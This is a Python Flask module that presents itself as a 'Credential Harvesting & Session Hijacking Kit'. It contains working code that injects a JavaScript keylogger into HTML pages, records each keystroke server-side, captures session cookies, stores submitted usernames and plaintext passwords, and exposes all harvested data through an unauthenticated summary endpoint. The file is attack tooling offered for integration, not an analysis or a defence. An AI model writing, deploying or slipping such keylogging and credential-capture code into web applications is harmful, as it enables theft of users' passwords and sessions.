"""
Credential Harvesting & Session Hijacking Kit
- XSS/SSRF credential steal
- Keylogger injection
- Session cookie theft
- AI-based credential validation (weak password detection)
"""

import re
import json
from flask import Blueprint, request, jsonify

cred_harvest_bp = Blueprint('cred_harvest', __name__)

# Simulated credential harvesting logic
class CredentialHarvester:
    def __init__(self):
        self.harvested = []

    def inject_keylogger(self, html):
        # Injects a simple JS keylogger
        keylogger = "<script>document.addEventListener('keydown',e=>fetch('/api/cred_harvest/keylog',{method:'POST',body:JSON.stringify({k:e.key})}))</script>"
        return html + keylogger

    def steal_cookies(self):
        # Simulates stealing session cookies
        return request.cookies.get('session', None)

    def ai_validate(self, username, password):
        # Simple weak password detection
        weak = len(password) < 8 or password.lower() in ['password','123456','admin']
        return {'username': username, 'password': password, 'weak': weak}

    def harvest(self, data):
        self.harvested.append(data)
        return True

harvester = CredentialHarvester()

@cred_harvest_bp.route('/api/cred_harvest/keylog', methods=['POST'])
def keylog():
    k = request.get_json(force=True).get('k')
    harvester.harvest({'type':'keylog','key':k})
    return '', 204

@cred_harvest_bp.route('/api/cred_harvest/steal', methods=['POST'])
def steal():
    cookie = harvester.steal_cookies()
    harvester.harvest({'type':'cookie','cookie':cookie})
    return jsonify({'cookie':cookie})

@cred_harvest_bp.route('/api/cred_harvest/validate', methods=['POST'])
def validate():
    data = request.get_json(force=True)
    result = harvester.ai_validate(data.get('username',''), data.get('password',''))
    harvester.harvest({'type':'validate','result':result})
    return jsonify(result)

@cred_harvest_bp.route('/api/cred_harvest/summary', methods=['GET'])
def summary():
    return jsonify({'harvested': harvester.harvested})

# For integration: expose harvester instance
get_cred_harvester = lambda: harvester
